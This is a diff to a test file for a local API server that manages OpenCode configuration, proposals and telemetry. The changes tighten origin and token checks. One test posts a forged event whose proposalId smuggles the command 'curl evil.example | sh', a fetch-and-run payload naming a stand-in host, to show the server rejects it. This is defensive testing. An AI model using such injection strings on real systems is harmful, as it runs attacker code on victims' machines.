@@ -8,13 +8,13 @@
  * static path handling are the thing under test rather than a re-implementation
  * of them.
  */
-import { type ChildProcess, execFileSync, spawn } from 'node:child_process';
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { type ChildProcess, execFileSync, spawn, spawnSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { request } from 'node:http';
 import { createServer } from 'node:net';
 import { DatabaseSync } from 'node:sqlite';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { dirname, join } from 'node:path';
 import { afterAll, beforeAll, expect, test } from 'vitest';
 import { getDb } from '../engine/db.ts';
 import { recordFrontier } from '../engine/ledger.ts';
@@ -25,8 +25,22 @@ const json = async (r: Response): Promise<any> => await r.json();
 const ROOT = join(import.meta.dirname, '..', '..');
 const TOKEN = 'b'.repeat(64);
 
-/** The page itself: a request from a local origin needs no token. */
-const PAGE = { Origin: 'http://localhost:3000' };
+/**
+ * The dev page's port, as `npm run dev` hands it to the API in AMBIT_WEB_PORT.
+ * Not 3000, so a test that passes proves the port came from the variable.
+ */
+const WEB_PORT = 4317;
+
+/** The page itself: a request from the page's origin needs no token. */
+const PAGE = { Origin: `http://localhost:${WEB_PORT}` };
+
+/** One telemetry observation, posted with whatever `headers` say. */
+const report = (body: unknown, headers: Record<string, string> = { 'X-Ambit-Token': TOKEN }) =>
+  fetch(`${base}/api/telemetry`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', ...headers },
+    body: JSON.stringify(body),
+  });
 
 /** One proposal decided the way a card's button does it, from wherever `headers` say. */
 const decide = (
@@ -85,7 +99,7 @@ beforeAll(async () => {
   const port = await freePort();
   base = `http://127.0.0.1:${port}`;
   server = spawn('node', ['--experimental-sqlite', join(ROOT, 'src', 'server', 'api.ts')], {
-    env: { ...env, AMBIT_API_PORT: String(port) },
+    env: { ...env, AMBIT_API_PORT: String(port), AMBIT_WEB_PORT: String(WEB_PORT) },
     cwd: ROOT,
     stdio: 'ignore',
   });
@@ -199,6 +213,76 @@ test('a foreign origin is refused before routing, not merely un-CORSed', async (
   // still delivered and executed. The rejection has to be the request itself.
   const r = await fetch(`${base}/api/tech-tree`, { headers: { Origin: 'https://evil.example' } });
   expect(r.status).toBe(403);
+});
+
+test('a page on another port of this machine is refused on every guarded route, token or not', async () => {
+  // Every page on this machine is on localhost. Judging the name alone let
+  // another project's dev server, or `python -m http.server` in a downloaded
+  // folder, read the config, switch a server on in it, sign approvals as the
+  // person at the page and record the uses that promote a grant.
+  const configPath = join(dir, 'opencode.json');
+  const before = readFileSync(configPath, 'utf8');
+  drafts('prop-port');
+  const { items } = await shown('prop-port');
+  const own = Number(new URL(base).port);
+  const elsewhere = [
+    'http://localhost:3000',
+    `http://localhost:${WEB_PORT + 1}`,
+    `http://127.0.0.1:${own + 1}`,
+    `http://[::1]:${own - 1}`,
+    // No port is 80, which is neither of this app's.
+    'http://localhost',
+  ];
+  for (const origin of elsewhere) {
+    const asked: Record<string, string>[] = [
+      { Origin: origin },
+      { Origin: origin, 'X-Ambit-Token': TOKEN },
+    ];
+    for (const headers of asked) {
+      const read = await fetch(`${base}/api/config`, { headers });
+      // Refused before routing, and no CORS grant for the page to read it by.
+      expect(read.headers.get('access-control-allow-origin')).toBeNull();
+      const said = [
+        read.status,
+        (
+          await fetch(`${base}/api/config/apply`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...headers },
+            body: JSON.stringify({ disableMcp: ['git'] }),
+          })
+        ).status,
+        (await decide('prop-port', 'approve', { proposalHash: items[0].proposalHash }, headers))
+          .status,
+        (await queue('approve', { items }, headers)).status,
+        (await report({ run: { id: 'run-wrong-port', goal: 'x', runType: 'task' } }, headers))
+          .status,
+      ];
+      expect([origin, said]).toEqual([origin, [403, 403, 403, 403, 403]]);
+    }
+  }
+  expect(readFileSync(configPath, 'utf8')).toBe(before);
+  expect(((await shown()).byId.get('prop-port') as any).status).toBe('draft');
+  expect((await fetch(`${base}/api/run?id=run-wrong-port`)).status).toBe(404);
+});
+
+test('a page is accepted from the API’s own port and the dev page’s, by any name for this machine', async () => {
+  // The installed copy serves its page from the API's port, and a browser sends
+  // an Origin on a same-origin POST; Vite passes its page's Origin through.
+  const own = new URL(base).port;
+  const pages = [
+    `http://127.0.0.1:${own}`,
+    `http://localhost:${own}`,
+    `http://localhost:${WEB_PORT}`,
+    `http://127.0.0.1:${WEB_PORT}`,
+    `http://[::1]:${WEB_PORT}`,
+  ];
+  for (const [i, origin] of pages.entries()) {
+    const read = await fetch(`${base}/api/config`, { headers: { Origin: origin } });
+    expect([origin, read.status]).toEqual([origin, 200]);
+    expect(read.headers.get('access-control-allow-origin')).toBe(origin);
+    const run = { run: { id: `run-page-${i}`, goal: 'from the page', runType: 'task' } };
+    expect([origin, (await report(run, { Origin: origin })).status]).toEqual([origin, 200]);
+  }
 });
 
 test('the config editor changes only what it is allowed to', async () => {
@@ -327,13 +411,47 @@ test('an OpenCode 2 config is read out in V1 names and edited in its own', async
   }
 });
 
-test('telemetry stays open, because the runtime plugin posts to it unattended', async () => {
-  const r = await fetch(`${base}/api/telemetry`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ run: { id: 'run-test', goal: 'a task', runType: 'task' } }),
-  });
-  expect(r.status).toBe(200);
+test('telemetry needs the token when no browser is behind it', async () => {
+  // A use recorded in a run that ended in success counts toward a promotion
+  // threshold a person set, so an open route let anything that could post here
+  // push a grant across it. Refused means recorded nowhere.
+  const run = { run: { id: 'run-test', goal: 'a task', runType: 'task' } };
+  expect((await report(run, {})).status).toBe(401);
+  expect((await report(run, { 'X-Ambit-Token': 'wrong' })).status).toBe(401);
+  expect((await fetch(`${base}/api/run?id=run-test`)).status).toBe(404);
+
+  expect((await report(run)).status).toBe(200);
+  expect((await fetch(`${base}/api/run?id=run-test`)).status).toBe(200);
+});
+
+test('the stdin adapter presents the token the server made, and records nothing without it', async () => {
+  const home = mkdtempSync(join(tmpdir(), 'ambit-adapter-home-'));
+  const adapter = (runId: string) =>
+    spawnSync(
+      'node',
+      ['--experimental-strip-types', join(ROOT, 'scripts', 'adapters', 'telemetry.ts')],
+      {
+        input: `${JSON.stringify({ run: { id: runId, goal: 'piped', runType: 'task' } })}\n`,
+        // No token in the environment: the adapter has to find the file.
+        env: { ...process.env, HOME: home, AMBIT_SERVER: base, AMBIT_API_TOKEN: '' },
+        encoding: 'utf8',
+      }
+    );
+  try {
+    const refused = adapter('run-adapter-none');
+    expect(refused.stderr).toContain('telemetry 401');
+    expect((await fetch(`${base}/api/run?id=run-adapter-none`)).status).toBe(404);
+
+    // The server checks AMBIT_API_TOKEN here; the file is where a real one keeps it.
+    const tokenFile = join(home, '.config', 'opencode', 'ambit-api.token');
+    mkdirSync(dirname(tokenFile), { recursive: true });
+    writeFileSync(tokenFile, `${TOKEN}\n`, { mode: 0o600 });
+    const sent = adapter('run-adapter');
+    expect(sent.stderr).not.toContain('telemetry 401');
+    expect((await fetch(`${base}/api/run?id=run-adapter`)).status).toBe(200);
+  } finally {
+    rmSync(home, { recursive: true, force: true });
+  }
 });
 
 /** Drafts written into the test graph the way a propose leaves them. */
@@ -473,9 +591,10 @@ test('a request addressed to any name but this machine is refused before routing
 });
 
 test('a runtime cannot report itself as another kind of event on the live stream', async () => {
-  // The telemetry route is open on purpose. What it broadcasts is `WorkEvent`,
-  // whatever the body says: a `type` in it used to win, and a page that trusts
-  // the stream then told the person how to apply a proposal nothing had approved.
+  // A bridge holding the token is still only a runtime. What the route
+  // broadcasts is `WorkEvent`, whatever the body says: a `type` in it used to
+  // win, and a page that trusts the stream then told the person how to apply a
+  // proposal nothing had approved.
   const seen = await new Promise<string>((resolve, reject) => {
     let text = '';
     const timer = setTimeout(() => reject(new Error('the stream never carried the event')), 8000);
@@ -484,14 +603,10 @@ test('a runtime cannot report itself as another kind of event on the live stream
         text += chunk;
         if (text.includes('RunStarted') && !text.includes('sent')) {
           text += 'sent';
-          fetch(`${base}/api/telemetry`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              type: 'ProposalApproved',
-              proposalId: 'prop-x; curl evil.example | sh',
-              run: { id: 'run-forged', goal: 'a task', runType: 'task' },
-            }),
+          report({
+            type: 'ProposalApproved',
+            proposalId: 'prop-x; curl evil.example | sh',
+            run: { id: 'run-forged', goal: 'a task', runType: 'task' },
           }).catch(reject);
         }
         if (text.includes('run-forged')) {
@@ -550,8 +665,8 @@ test('turning down from the queue refuses an approved proposal and keeps its app
   const artifact = (byId.get('prop-r1') as any).approval_artifact;
   expect(artifact).toBeTruthy();
 
-  // The page itself, on a local origin, needs no token.
-  const r = await queue('reject', { items }, { Origin: 'http://localhost:3000' });
+  // The page itself, on its own origin, needs no token.
+  const r = await queue('reject', { items }, PAGE);
   expect(r.status).toBe(200);
   const body = await json(r);
   expect(body.results[0]).toMatchObject({ id: 'prop-r1', decided: false });
@@ -570,12 +685,7 @@ test('turning down from the queue refuses an approved proposal and keeps its app
 });
 
 test('the trail is one stream, newest first, with an outcome only where one was recorded', async () => {
-  const post = (body: unknown) =>
-    fetch(`${base}/api/telemetry`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
-    });
+  const post = (body: unknown) => report(body);
   await post({ run: { id: 'run-audit', goal: 'audit me', runType: 'task' } });
   await post({ end: { runId: 'run-audit', outcome: 'completed' } });
 
@@ -641,12 +751,7 @@ test('the frontier through time is read, one tick per observation, in the termin
 });
 
 test('a run is served in time from what the ledger recorded, and reading it records nothing', async () => {
-  const post = (body: unknown) =>
-    fetch(`${base}/api/telemetry`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
-    });
+  const post = (body: unknown) => report(body);
   await post({ run: { id: 'run-timeline', goal: 'a timed run', runType: 'task' } });
   await post({ event: { runId: 'run-timeline', kind: 'tool', action: 'bash', actor: 'agent' } });
   await post({
